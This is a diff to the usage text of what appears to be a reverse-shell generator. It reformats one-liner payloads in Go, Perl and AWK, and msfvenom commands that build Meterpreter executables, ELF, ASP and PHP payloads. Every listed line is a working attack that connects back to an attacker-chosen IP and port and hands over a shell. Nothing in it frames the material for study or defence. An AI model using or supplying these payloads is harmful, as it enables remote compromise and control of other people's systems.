@@ -67,16 +67,16 @@ RUBY
 
 
 GOLANG
--g		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","[ip]:[port]");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c 		    cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+-g		echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","[ip]:[port]");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 
 
 PERL
--pe		perl -e 'use Socket;$i="[ip]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) 			{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+-pe		perl -e 'use Socket;$i="[ip]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 -pe2		perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[ip]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'			
 -pw		perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[ip]:[port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'	(windows only)
 
 AWK
--a		awk 'BEGIN {s = "/inet/tcp/0/[ip]/[port]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; 		  close(c); } } while(c != "exit") close(s); }}' /dev/null
+-a		awk 'BEGIN {s = "/inet/tcp/0/[ip]/[port]"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 
 POWERSHELL
 -ps1            too long and messy to print out here
@@ -96,7 +96,7 @@ MSFVENOM STAGED
 -m1s    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f exe > [name].exe
 -m2s    	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f elf > [name].elf
 -mas    	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f asp > [name].asp
--mps		msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].php; cat [name].php | xsel --clipboard --input && echo '<?php ' | tr 		     -d '\n' > [name].php && xsel --clipboard --output >> [name].php
+-mps		msfvenom -p php/meterpreter_reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [name].php; cat [name].php | xsel --clipboard --input && echo '<?php ' | tr -d '\n' > [name].php && xsel --clipboard --output >> [name].php
                 (requires xsel)
 
 LAZY OPTIONS
